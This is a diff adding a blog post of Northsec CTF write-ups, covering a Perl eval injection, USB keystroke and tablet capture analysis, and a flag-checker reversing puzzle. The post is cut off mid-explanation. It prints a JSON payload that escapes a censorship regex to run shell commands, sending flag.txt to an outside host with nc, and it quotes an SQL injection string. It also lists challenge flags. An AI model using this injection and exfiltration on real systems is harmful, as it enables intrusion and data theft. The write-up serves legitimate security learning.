@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Northsec CTF :: Noonker — thoughts, guides, etc</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="I was lucky enough to get to compete in the Northsec CTF this weekend with the cold_root team. We ended up placing 4th out of 88 teams. There was a ton of awesome (and maddening) challenges and plenty of Malört consumed. The challenges showed up on a fantasy themed forum:
+Scammed Again   The first thing I did was go to the web page to find that it was a chat dialogue with an enchanter named…." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://noonker.github.io/posts/2021-05-24-northsec-ctf/" />
+
+
+
+
+<link rel="stylesheet" href="https://noonker.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://noonker.github.io/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://noonker.github.io/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://noonker.github.io/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  <meta name="twitter:site" content="https://twitter.com" />
+
+<meta name="twitter:creator" content="" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Northsec CTF :: Noonker">
+<meta property="og:description" content="I was lucky enough to get to compete in the Northsec CTF this weekend with the cold_root team. We ended up placing 4th out of 88 teams. There was a ton of awesome (and maddening) challenges and plenty of Malört consumed. The challenges showed up on a fantasy themed forum:
+Scammed Again   The first thing I did was go to the web page to find that it was a chat dialogue with an enchanter named…." />
+<meta property="og:url" content="https://noonker.github.io/posts/2021-05-24-northsec-ctf/" />
+<meta property="og:site_name" content="Northsec CTF" />
+
+  
+    <meta property="og:image" content="https://noonker.github.io/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-05-24 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://noonker.github.io/posts/2021-05-24-northsec-ctf/">Northsec CTF</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2021-05-24
+    </span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://noonker.github.io/tags/tech/">tech,</a>&nbsp;
+    
+    #<a href="https://noonker.github.io/tags/ctf/">ctf</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  <div class="post-content"><div>
+        
+<p>
+<img src="/images/northsec_blackcat.png" alt="/images/northsec_blackcat.png" title="/images/northsec_blackcat.png" /></p>
+<p>
+I was lucky enough to get to compete in the  <a href="https://nsec.io/">Northsec</a> CTF this weekend with the cold_root team. We ended up placing 4th out of 88 teams. There was a ton of awesome (and maddening) challenges and plenty of Malört consumed. The challenges showed up on a fantasy themed forum:</p>
+<div id="outline-container-headline-1" class="outline-2">
+<h2 id="headline-1">
+Scammed Again
+</h2>
+<div id="outline-text-headline-1" class="outline-text-2">
+<p><img src="/images/northsec_forum_scammedagain.png" alt="/images/northsec_forum_scammedagain.png" title="/images/northsec_forum_scammedagain.png" /></p>
+<p>
+The first thing I did was go to the web page to find that it was a chat dialogue with an enchanter named…. Tim? I was hoping that this would include some Monthy Python trivia or perhaps an altercation with a foul and cruel creature with big pointy teeth.</p>
+<p>
+<img src="/images/northsec_scammed_chat.png" alt="/images/northsec_scammed_chat.png" title="/images/northsec_scammed_chat.png" /></p>
+<p>
+Unfortunately fate would be more cruel. It was a Perl webserver for which we had some of the source code.</p>
+<p>
+When you send a message to Tim a request is posted to the webserver:</p>
+<div class="src src-json">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#f92672">&#34;msg&#34;</span>: <span style="color:#e6db74">&#34;yo dawg&#34;</span>,
+ <span style="color:#f92672">&#34;censored_words&#34;</span>: <span style="color:#e6db74">&#34;Pleb|Dumb|Bespawler|Cumberworld|Fopdoodle|fustilugs|fustilarian&#34;</span>}</code></pre></div>
+</div>
+<p>
+I&#39;m not sure the point of letting a user control their own censored wordlist…</p>
+<p>
+The the following method in the webserver code is the one that handles the user input. It is meant to taken the list of user censored words and censor the message the user sent:</p>
+<div class="src src-perl">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">run_wizzard_censorship</span> {
+  <span style="color:#66d9ef">my</span> ($str, $pattern) <span style="color:#f92672">=</span> @_;
+  <span style="color:#66d9ef">unless</span> (exists $CACHED_PATTERNS{$pattern}) {
+    (<span style="color:#66d9ef">my</span> $escaped_pattern <span style="color:#f92672">=</span> $pattern) <span style="color:#f92672">=~</span> <span style="color:#e6db74">s!([/\$\[\(\.])!\\$1!g</span>;
+    $CACHED_PATTERNS{$pattern} <span style="color:#f92672">=</span> eval <span style="color:#e6db74">&#34;sub { \$_[0] =~ s/($escaped_pattern)/\&#34;*\&#34;x (length \$1)/gie }&#34;</span> <span style="color:#f92672">or</span> croak $@;
+  }
+  $CACHED_PATTERNS{$pattern}<span style="color:#f92672">-&gt;</span>($str);
+
+  <span style="color:#66d9ef">return</span> $str;
+}</code></pre></div>
+</div>
+<p>
+I didn&#39;t know perl when I started this but any time I see a string being <code class="verbatim">eval</code>&#39;d I know I should start looking for injection. The line:</p>
+<div class="src src-perl">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl">(<span style="color:#66d9ef">my</span> $escaped_pattern <span style="color:#f92672">=</span> $pattern) <span style="color:#f92672">=~</span> <span style="color:#e6db74">s!([/\$\[\(\.])!\\$1!g</span>;</code></pre></div>
+</div>
+<p>was meant to escape any dangerous symbols from the <code class="verbatim">censored_words</code>. It escapes the opening bracket/parenthesis but doesn&#39;t escape the closing bracket. But more importantly it doesn&#39;t ommit the <code class="verbatim">\</code> character. This allows us to backslash our own input which will cause this to backslash our backslash and allow us to insert dangerous characters.</p>
+<p>
+The next line was pretty difficult to understand for a perl newbie like myself:</p>
+<div class="src src-perl">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl">eval <span style="color:#e6db74">&#34;sub { \$_[0] =~ s/($escaped_pattern)/\&#34;*\&#34;x (length \$1)/gie }&#34;</span>
+
+<span style="color:#75715e"># Interprets the string as perl code:</span>
+eval <span style="color:#e6db74">&#34;...&#34;</span>
+
+<span style="color:#75715e"># Defines a sub method</span>
+<span style="color:#66d9ef">sub</span> {<span style="color:#f92672">...</span>}
+
+<span style="color:#75715e"># Places the passed argument into the following regex</span>
+$_[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=~</span> <span style="color:#e6db74">s/.../gie
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"># Inserts the patten from the previous line which is the &#34;safe&#34; version of the user passed censored_words
+</span><span style="color:#e6db74">($escaped_pattern)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"># Replaces the the matched strings with a number of *&#39;s matching the length of the pased arguments
+</span><span style="color:#e6db74">\&#34;*\&#34;x (length \$1)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"># The arguments gie mean replace all case-insensitive occurences and treats the replacement section as perl code that should be evaluated
+</span><span style="color:#e6db74">.../gie</span></code></pre></div>
+</div>
+<p>
+It might not have been necessary to dig this deep into the code because we&#39;re going to disgreguard most of this line. The following payload allows us to get RCE:</p>
+<div class="src src-json">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#f92672">&#34;msg&#34;</span>: <span style="color:#e6db74">&#34;cool&#34;</span>, <span style="color:#f92672">&#34;censored_words&#34;</span>: <span style="color:#e6db74">&#34;wereall\/countingonyou\/g; `cat flag.txt | nc shell.ctf 1337`;}  #&#34;</span>}</code></pre></div>
+</div>
+<p>
+This closes the expression replacing <code class="verbatim">wereall\</code> with <code class="verbatim">countingonyou\</code> but that&#39;s not important right now. We then end the perl expression with <code class="verbatim">;</code> and run a command in the subshell with <code class="verbatim">`cmd`</code> which in this case cat&#39;s the file in flag.txt to a netcat listener running on a server we own.</p>
+<blockquote>
+<p>./askgod submit FLAG-46fee13ea855cd36bf6f0d52d9f7a72e
+Congratulations, you score your team 3 points!</p>
+</blockquote>
+</div>
+</div>
+<div id="outline-container-headline-2" class="outline-2">
+<h2 id="headline-2">
+Goldsmith&#39;s Guild Part 1
+</h2>
+<div id="outline-text-headline-2" class="outline-text-2">
+<p>
+<img src="/images/northsec_forum_goldsmith.png" alt="/images/northsec_forum_goldsmith.png" title="/images/northsec_forum_goldsmith.png" /></p>
+<p>
+This was a PCAP containing a USB dump of what appears to be a barcode scanner.</p>
+<p>
+The first challenge was identifying the name of the access card. This can be found by looking at the handshake between the usb device and host.</p>
+<p>
+<img src="/images/northsec_goldsmith_1.png" alt="/images/northsec_goldsmith_1.png" title="/images/northsec_goldsmith_1.png" /></p>
+<blockquote>
+<p>flag-card_EVHK0012</p>
+</blockquote>
+<p>
+The next flag would require understanding what the data means. To understand how the data looks let&#39;s apply it as a column in Wireshark.
+<img src="/images/northsec_goldsmith_2.png" alt="/images/northsec_goldsmith_2.png" title="/images/northsec_goldsmith_2.png" /></p>
+<p>
+and export the data as a csv for analysis.
+<img src="/images/northsec_goldsmith_4.png" alt="/images/northsec_goldsmith_4.png" title="/images/northsec_goldsmith_4.png" /></p>
+<p>
+Thanks to  <a href="https://raw.githubusercontent.com/TeamRocketIst/ctf-usb-keyboard-parser/master/usbkeyboard.py">TeamRocketIst</a> for the KEYCODES dict I lifted from their Github page. I created this script which looks at the data and parses the bits that represent whether or not the shift key is pressed and the bits that represented the data. I figured this out by looking at the entropy of the different bytes in the data</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">KEY_CODES <span style="color:#f92672">=</span> {
+    <span style="color:#ae81ff">0x04</span>:[<span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span>],
+    <span style="color:#ae81ff">0x05</span>:[<span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;B&#39;</span>],
+    <span style="color:#f92672">...</span>
+    <span style="color:#ae81ff">0x52</span>:[<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;↑&#39;</span>,<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;↑&#39;</span>]
+}
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decode_keypress</span>(keypress):
+    shift <span style="color:#f92672">=</span> False
+    <span style="color:#66d9ef">if</span> keypress[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;02&#34;</span>:
+        shift <span style="color:#f92672">=</span> True
+    <span style="color:#66d9ef">if</span> keypress[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;00&#34;</span>:
+        <span style="color:#66d9ef">return</span> None
+    <span style="color:#66d9ef">if</span> shift:
+        <span style="color:#66d9ef">return</span> KEY_CODES[int(keypress[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">6</span>],<span style="color:#ae81ff">16</span>)][<span style="color:#ae81ff">1</span>]
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">return</span> KEY_CODES[int(keypress[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">6</span>],<span style="color:#ae81ff">16</span>)][<span style="color:#ae81ff">0</span>]
+
+a <span style="color:#f92672">=</span> pd<span style="color:#f92672">.</span>read_csv(<span style="color:#e6db74">&#34;~/wireshark_dump.csv&#34;</span>)
+
+<span style="color:#75715e"># I added HID Data as a header manually</span>
+hid <span style="color:#f92672">=</span> a[<span style="color:#e6db74">&#34;HID Data&#34;</span>]<span style="color:#f92672">.</span>apply(<span style="color:#66d9ef">lambda</span> x: x[<span style="color:#ae81ff">2</span>:])
+keys <span style="color:#f92672">=</span> hid<span style="color:#f92672">.</span>apply(<span style="color:#66d9ef">lambda</span> x: decode_keypress(x))
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(keys<span style="color:#f92672">.</span>dropna()<span style="color:#f92672">.</span>to_list()))</code></pre></div>
+</div>
+<p>
+Bingo:</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">sir alsaagha
+sir ourives
+&#39;);INSERT INTO GUILD_USERS VALUES(1337,&#39;ZmxhZy1jYXJkX2ZhcmFkYXlfYmFja2Rvb3I=&#39;);--
+flag-card_faraday_backdoor
+sir yuveliry
+sir oreficeria</code></pre></div>
+</div>
+<blockquote>
+<p>What&#39;s the odd username used to breach into the guild?
+flag-card_faraday_backdoor</p>
+<p>
+What&#39;s the name of the attack used to break into the guild?
+flag-card_sqlinjection</p>
+</blockquote>
+</div>
+</div>
+<div id="outline-container-headline-3" class="outline-2">
+<h2 id="headline-3">
+Goldsmiths&#39; Guild Part 2
+</h2>
+<div id="outline-text-headline-3" class="outline-text-2">
+<p>
+<img src="/images/northsec_forum_goldsmith_2.png" alt="/images/northsec_forum_goldsmith_2.png" title="/images/northsec_forum_goldsmith_2.png" />
+In this challenge we were presented with the same scenerio but a different device:</p>
+<p>
+Flag 1 can be identified the same way as Goldsmiths&#39; Part 1
+<img src="/images/northsec_goldsmiths_autograph_1.png" alt="/images/northsec_goldsmiths_autograph_1.png" title="/images/northsec_goldsmiths_autograph_1.png" /></p>
+<blockquote>
+<p>flag-Wacom-CTE-440</p>
+</blockquote>
+<p>
+Data is exported in the same way as well. I did a LOT of digging into the USB HID spec and was aided greatly by <a href="https://github.com/scanlime">Scanlime&#39;s</a> great video series on hacking the wacom.</p>
+<p>
+Unfortunely I wasn&#39;t able to find anything that matched the 5 byte data stream present here. We were able to figure out that this was a Wacom tablet and we could look at how much entropy was in the different fields of the data:
+<img src="/images/northsec_goldsmiths_autograph_2.png" alt="/images/northsec_goldsmiths_autograph_2.png" title="/images/northsec_goldsmiths_autograph_2.png" /></p>
+<p>
+I assumed that the bytes 3 &amp; 4 were the byes that represented the x and y axis. Because this was a Wacom tablet I assumed these would be absolute values even though it didn&#39;t seem likely given that there would only be 256 x 256 possible points on the tablet.. but this also happened to be the easier version of the code to write so I tried that first.</p>
+<p>
+<img src="/images/northsec_goldsmiths_autograph_3.png" alt="/images/northsec_goldsmiths_autograph_3.png" title="/images/northsec_goldsmiths_autograph_3.png" /></p>
+<p>
+No luck but this looks like we&#39;re on to something. The next attempt was to use the assumed X and Y values as relative values:</p>
+<p>
+<img src="/images/northsec_goldsmiths_autograph_4.png" alt="/images/northsec_goldsmiths_autograph_4.png" title="/images/northsec_goldsmiths_autograph_4.png" /></p>
+<p>
+MUCH closer but still not quite readable. I applied some condition to use the binary field in the data assuming this was a pen on/off field. I also changed the icons from a bit dot to a smaller cross.</p>
+<p>
+<img src="/images/northsec_goldsmiths_autograph_5.png" alt="/images/northsec_goldsmiths_autograph_5.png" title="/images/northsec_goldsmiths_autograph_5.png" /></p>
+<p>
+Bingo!</p>
+<p>
+Here&#39;s the code used to analyze the data:</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> pandas_bokeh
+<span style="color:#f92672">import</span> pandas <span style="color:#f92672">as</span> pd
+pandas_bokeh<span style="color:#f92672">.</span>output_notebook()
+df <span style="color:#f92672">=</span> pd<span style="color:#f92672">.</span>read_csv(<span style="color:#e6db74">&#34;~/Downloads/autograph.csv&#34;</span>)[<span style="color:#e6db74">&#34;HID Data&#34;</span>]
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+length <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Plotter</span>():
+    <span style="color:#66d9ef">def</span> __init__(self, x, y):
+        self<span style="color:#f92672">.</span>x <span style="color:#f92672">=</span> x
+        self<span style="color:#f92672">.</span>y <span style="color:#f92672">=</span> y
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">updatexy</span>(self, rel_x, rel_y, pressure):
+        self<span style="color:#f92672">.</span>x <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>x <span style="color:#f92672">+</span> rel_x
+        self<span style="color:#f92672">.</span>y <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>y <span style="color:#f92672">+</span> rel_y
+        <span style="color:#66d9ef">if</span> pressure:
+            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>x, self<span style="color:#f92672">.</span>y
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>
+
+p <span style="color:#f92672">=</span> Plotter(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_x_y</span>(hexbytes):
+    half <span style="color:#f92672">=</span> int(length<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>)
+    x <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(bytes<span style="color:#f92672">.</span>fromhex(hexbytes[<span style="color:#ae81ff">0</span>:half]),  byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;little&#39;</span>, signed<span style="color:#f92672">=</span>True) <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span>
+    y <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>int<span style="color:#f92672">.</span>from_bytes(bytes<span style="color:#f92672">.</span>fromhex(hexbytes[half:length]),  byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;little&#39;</span>, signed<span style="color:#f92672">=</span>True)
+    <span style="color:#66d9ef">return</span> (x, y)
+
+out <span style="color:#f92672">=</span> df<span style="color:#f92672">.</span>str[offset<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:offset<span style="color:#f92672">+</span>length]<span style="color:#f92672">.</span>apply(<span style="color:#66d9ef">lambda</span> x:p<span style="color:#f92672">.</span>updatexy(<span style="color:#f92672">*</span>get_x_y(x[<span style="color:#ae81ff">1</span>:]), True) <span style="color:#66d9ef">if</span> x[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#66d9ef">else</span> p<span style="color:#f92672">.</span>updatexy(<span style="color:#f92672">*</span>get_x_y(x[<span style="color:#ae81ff">1</span>:]), False))
+xy <span style="color:#f92672">=</span> pd<span style="color:#f92672">.</span>DataFrame(out<span style="color:#f92672">.</span>to_list(), columns<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;x&#34;</span>, <span style="color:#e6db74">&#34;y&#34;</span>])
+xy<span style="color:#f92672">.</span>plot_bokeh<span style="color:#f92672">.</span>scatter(x<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x&#34;</span>, y<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;y&#34;</span>, marker<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cross&#34;</span>)</code></pre></div>
+</div>
+<blockquote>
+<p>/askgod submit flag-sir_mon3y_l4und3ring
+Congratulations, you score your team 4 points!
+Message: Strange password for a guild member. (Flags: 2/2)</p>
+</blockquote>
+</div>
+</div>
+<div id="outline-container-headline-4" class="outline-2">
+<h2 id="headline-4">
+YesWeHack
+</h2>
+<div id="outline-text-headline-4" class="outline-text-2">
+<p>
+<img src="/images/northsec_yeswehack.png" alt="/images/northsec_yeswehack.png" title="/images/northsec_yeswehack.png" /></p>
+<p>
+This challenge was to reverse engineer this algorithm:</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> re
+<span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> reduce
+
+FLAG_REG <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;^\d{0,16}9$&#34;</span>)
+KEY <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xC3F80B633F90C6DE</span>
+OPS <span style="color:#f92672">=</span> [
+    <span style="color:#66d9ef">lambda</span> x: ([<span style="color:#66d9ef">print</span>(x), x][<span style="color:#ae81ff">1</span>]),
+    <span style="color:#66d9ef">lambda</span> x: x <span style="color:#f92672">-</span> ((KEY <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span>) <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span> <span style="color:#f92672">|</span> x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>,
+    <span style="color:#66d9ef">lambda</span> x: x <span style="color:#f92672">-</span> ((KEY <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span>) <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span> <span style="color:#f92672">|</span> x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>,
+    <span style="color:#66d9ef">lambda</span> x: x <span style="color:#f92672">+</span> ((KEY <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span>) <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span> <span style="color:#f92672">|</span> x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>,
+    <span style="color:#66d9ef">lambda</span> x: x <span style="color:#f92672">+</span> ((KEY <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span>) <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span> <span style="color:#f92672">|</span> x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>,
+    <span style="color:#66d9ef">lambda</span> x: x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span> <span style="color:#f92672">|</span> x <span style="color:#f92672">+</span> ((KEY <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span>) <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>x) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>,
+    <span style="color:#66d9ef">lambda</span> x: x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span> <span style="color:#f92672">|</span> x <span style="color:#f92672">+</span> ((KEY <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span>) <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> x) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>,
+    <span style="color:#66d9ef">lambda</span> x: x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span> <span style="color:#f92672">|</span> x <span style="color:#f92672">-</span> ((KEY <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span>) <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>x) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>,
+    <span style="color:#66d9ef">lambda</span> x: x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span> <span style="color:#f92672">|</span> x <span style="color:#f92672">-</span> ((KEY <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">56</span>) <span style="color:#f92672">&gt;&gt;</span> (x <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> x) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>,
+    <span style="color:#66d9ef">lambda</span> x: [<span style="color:#e6db74">&#34;Good flag!&#34;</span>, <span style="color:#e6db74">&#34;Bad flag!&#34;</span>][x <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>],
+]
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    flag <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;FLAG-&#34;</span>)
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> FLAG_REG<span style="color:#f92672">.</span>match(flag):
+        exit(<span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">print</span>(reduce(<span style="color:#66d9ef">lambda</span> x, c: OPS[c](x), (int(c) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> flag), <span style="color:#ae81ff">48</span>))</code></pre></div>
+</div>
+<p>
+There&#39;s a couple of parts to this that were important to understand. This let us know our key is going to be 0-16 digits and end with a 9</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">FLAG_REG <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;^\d{0,16}9$&#34;</span>)</code></pre></div>
+</div>
+<p>
+This function shows us that the key is derived by taking each digit in the user input and calling the function associated on that data on whatever number is in the accumulator (which starts with a seed of 48)</p>
+<div class="src src-python">
